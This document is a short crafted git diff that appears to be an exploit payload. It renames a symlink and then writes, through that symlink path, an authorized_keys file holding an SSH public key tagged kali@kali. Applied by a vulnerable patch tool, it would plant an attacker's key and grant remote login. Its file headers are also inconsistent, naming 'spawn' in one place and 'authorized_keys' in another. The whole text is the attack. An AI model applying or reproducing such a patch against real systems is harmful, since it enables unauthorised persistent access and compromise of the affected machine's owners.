@@ -1,0 +1,12 @@
+diff --git a/symlink b/newsymlink
+rename from symlink
+rename to newsymlink
+--
+diff --git /dev/null b/newsymlink/spawn
+new file mode 100644
+index 0000000..e47f4ea
+--- /dev/null
++++ b/newsymlink/authorized_keys
+@@ -0,0 +1 @@
++ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDA8iyhPVg6rcrDdihYkBWTbfqdnSxQ3BMFg7IPyC4ZJ5qRdZRCJqf6e4hqXOY5COOk3vlvMX7NH1e7u2Q0vS5tYWDG7NFJ4Y5nsoGh2LnR7luD8RyxnDXCeIWPKhqb7cVqUF5y+wtMg3Uj+dRjUaQjX6FAygN7zhulQev/H5LCFaumVGzOXHhBtzMaP+iOCllqcxq4RLP/YhIWCGH5V/8SkRyJJ68+1CmVDaHqBp0X8xsGMwV1jBTTMK2RdTKdXT4TJ9BWYrnpdGaH4FRjmPBpR2Mq1h33jtjAxH/ScLGkQVi0R+AbiOUuPrZnSDiKIqXqQn0ITrMLUaYmj3B7yajePD6k/wOFqkEKlfW5r0rqkWXTGCHSsWY8xE/EohjqBrro+81w9szRDxPhvLrmwifo/MaldZcVwD6qauoMmrL93b0+hLw/Tsih7zFYPmT5zx/X7na4DXgK6dIOUZpTjv0rEq6+y5oAnn4lfpVuxGEqm7W+LqRYIEhf2itHq2RcflE= kali@kali
+\ No newline at end of file
